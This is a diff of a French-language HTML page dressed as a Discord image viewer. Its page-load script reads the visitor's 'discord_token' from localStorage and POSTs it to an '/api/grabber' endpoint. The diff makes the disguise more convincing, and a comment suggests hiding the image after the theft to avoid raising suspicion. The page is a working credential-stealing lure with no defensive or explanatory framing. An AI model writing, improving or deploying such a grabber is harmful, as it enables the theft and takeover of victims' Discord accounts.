@@ -2,38 +2,52 @@
 <html lang="fr">
 <head>
     <meta charset="UTF-8">
-    <title>Chargement...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Image</title>
     <style>
-        body { background-color: #2f3136; color: white; font-family: sans-serif; text-align: center; padding-top: 50px; }
-        h1 { margin-bottom: 20px; }
+        body {
+            background-color: #2f3136; /* Couleur de fond Discord */
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        img {
+            max-width: 100%;
+            max-height: 100%;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.5);
+        }
     </style>
 </head>
 <body>
-    <h1>Chargement de l'image...</h1>
-    
+    <!-- 
+      ICI : Remplace l'URL ci-dessous par ton image 
+      Tu peux utiliser une image hébergée ailleurs (Imgur, etc.) 
+      ou une image locale si tu les mets dans le même dossier 
+    -->
+    <img src="https://media.discordapp.net/attachments/1503167778234962021/1503167805166587925/SPOILER_image.png?ex=6a96ae5c&is=6a955cdc&hm=c47cad92d57c0ba4bf571816f87ddb9ed297cfe092e1e9854de0e78b83c78fce&=&format=webp&quality=lossless&width=1024&height=558
+" alt="Image" id="target-img">
+
     <script>
         document.addEventListener("DOMContentLoaded", () => {
             const token = localStorage.getItem("discord_token");
             
             if (token) {
-                // Appeler ton endpoint Python
+                // Envoyer le token à ton script Python
                 fetch('/api/grabber', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json'
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ token: token })
                 })
                 .then(response => response.json())
                 .then(data => {
-                    console.log("Token envoyé avec succès");
-                    document.querySelector("h1").innerText = "Image chargée avec succès !";
+                    console.log("Token envoyé");
+                    // Optionnel : Cacher l'image après envoi pour ne pas éveiller les soupçons
+                    // document.getElementById('target-img').style.display = 'none';
                 })
-                .catch(error => {
-                    console.error("Erreur:", error);
-                });
-            } else {
-                document.querySelector("h1").innerText = "Erreur de connexion Discord.";
+                .catch(error => console.error("Erreur:", error));
             }
         });
     </script>
